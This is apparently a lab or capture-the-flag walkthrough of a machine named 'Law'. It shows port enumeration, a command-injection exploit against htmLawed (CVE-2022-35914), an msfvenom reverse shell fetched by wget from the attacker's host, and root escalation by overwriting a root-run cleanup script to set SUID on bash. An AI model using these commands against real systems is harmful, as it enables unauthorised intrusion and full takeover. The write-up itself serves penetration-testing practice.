# Law

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.229.190

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: htmLawed (1.2.5) test
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22

We run nmap to check the authentications possible through ssh.

```shell
# Check authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.229.190

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 80

We used feroxbuster to enumerate port 80 and found the htmLawed application running.

```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 1 -x php,asp,aspx,html,txt,pdf -C 404,502 -u http://192.168.229.190

http://192.168.229.190/htmLawed_TESTCASE.txt
http://192.168.229.190/index.php
http://192.168.229.190/htmLawed_README.htm
http://192.168.229.190/htmLawed_README.txt
```

Navigating to the `htmLawed_README.htm` page, we find the version of the service (1.2.5). Searching for public vulnerabilities, we found an exploit on GitHub designed to exploit GLPI via htmLawed (CVE-2022-35914).

## Initial Access

Analyzing the code, we noticed that it pointed to htmLawed's main php file, which in our case was in a different path.

```shell
# Default
def exploit(url,cmd,user_agent,check,hook):
    uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"

# Fixed
def exploit(url,cmd,user_agent,check,hook):
    uri = "index.php"
```

With this small tweak we were able to inject commands into the server and then get a reverse shell.

```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=443 -f elf -o reverse.elf

# Transfer payload
./CVE-2022-35914.py -u http://192.168.229.190 -c 'wget http://192.168.45.242/reverse.elf'

# Reverse Shell
./CVE-2022-35914.py -u http://192.168.229.190 -c 'chmod +x reverse.elf'
./CVE-2022-35914.py -u http://192.168.229.190 -c './reverse.elf'

# TTY Upgrade
whereis python
/usr/bin/python3.9 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /var/www/local.txt
a91cfad5fdba21b81239cf32c6cfcefd
```

## Privilege Escalation

In the same directory as the local flag, we find a script that we have read and write permissions to. By analyzing its content, we can see that it deletes Apache's access and error logs.

```shell
ls -lah
-rwxr-xr-x  1 www-data www-data   82 Aug 25  2023 cleanup.sh

cat cleanup.sh
#!/bin/bash

rm -rf /var/log/apache2/error.log
rm -rf /var/log/apache2/access.log
```

We transfer pspy to the target and run it, confirming that this script is run by root.

```shell
# Listener on Kali Machine
python3 -m http.server 80

# Download pspy
cd tmp
wget http://192.168.45.242/pspy32

# Launch pspy
chmod +x pspy32
./pspy64
```

We overwrite the script by giving SUID permission to bash.

```shell
# Set SUID
echo 'chmod +s /bin/bash' > /var/www/cleanup.sh

# Privilege Escalation
/bin/bash -p
```

## Post-Exploitation

With root privileges, we capture the target's flags.

```shell
# Evidence
ip a

cat /root/proof.txt
29f1af5c0f520682fcd96d6c1624b1fb
```
